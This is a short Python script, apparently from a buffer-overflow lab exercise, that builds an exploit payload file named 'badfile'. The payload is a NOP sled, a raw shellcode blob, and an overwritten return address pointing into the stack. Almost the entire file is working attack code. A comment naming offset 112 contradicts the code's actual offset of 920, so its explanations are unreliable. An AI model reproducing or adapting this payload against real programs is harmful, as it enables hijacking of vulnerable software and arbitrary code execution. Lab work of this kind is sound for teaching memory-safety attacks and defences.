#public ip: 20.197.3.244

import sys 
 
shellcode= ( 
"\x48\xBB\xFF\x51\x55\x55\x55\x55\x00\x00\x6A\x09\x6A\x01\xFF\xD3\x48\x31\xC9\x51\x50\xFF\xD3\x6A\x05\x50\xFF\xD3\x6A\x01\x50\xFF\xD3\x48\x31\xC9\x51\x50\xFF\xD3\x6A\x05\x50\xFF\xD3"
).encode('latin-1') 
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(1958)) 
# Put the shellcode at the end 
start = 1958 - len(shellcode) 
content[start:] = shellcode 
 
# Put the address at offset 112 
ret =  0x7fffffffd7d0 + 800
content[920:928] = (ret).to_bytes(8,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 


